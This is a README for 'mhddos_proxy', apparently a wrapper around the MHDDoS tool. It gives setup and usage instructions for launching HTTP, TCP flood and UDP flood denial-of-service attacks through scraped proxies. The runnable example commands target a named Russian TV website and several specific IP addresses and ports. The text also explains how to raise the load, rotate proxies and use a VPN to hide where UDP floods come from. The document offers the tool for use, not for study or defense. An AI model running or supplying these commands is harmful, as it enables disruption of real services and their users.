## Setup

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    git clone https://github.com/monosans/proxy-scraper-checker.git
    python3 -m pip install requirements.txt

# Usage

    python3 runner.py --help

    usage: runner.py [-h] 
                     [-t THREADS] 
                     [-p PERIOD]
                     [--proxy-timeout TIMEOUT]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]
                     target [target ...]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -t 100                 Number of threads per CPU core (default is 100)
      -p 300                 How often to update the proxies (default is 300)
      --proxy-timeout 3      How many seconds to wait for the proxy to make a connection.
                             Higher values give more proxies, but with lower speed/quality.
                             Parsing also takes more time (default is 3)

      --rpc 100              How many requests to send on a single proxy connection (default is 100)

      --http-methods GET     List of HTTP(s) attack methods to use.
                             Default is GET, STRESS, BOT, DOWNLOADER.
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# Examples

For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).  
For TCP targets, attack method is TCP FLOOD  
For UDP targets, attack method is UDP FLOOD. **VPN IS REQUIRED FOR UDP**, proxying is not supported.

    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

Target specification

- HTTP(S) by URL  - `https://tvzvezda.ru` or `http://tvzvezda.ru` 
- HTTP by IP:PORT - `5.188.56.124:9000`
- TCP by IP:PORT  - `tcp://194.54.14.131:4477`
- UDP by IP:PORT  - `udp://217.175.155.100:53` - **REQUIRES VPN**

Increase load

    python3 runner.py -t 300 https://tvzvezda.ru

Update proxies less often (every 10 minutes)

    python3 runner.py -p 600 https://tvzvezda.ru

Get more proxies (possibly lower quality)

    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru

# TODO

- [ ] Docker image
- [ ] Debug mode
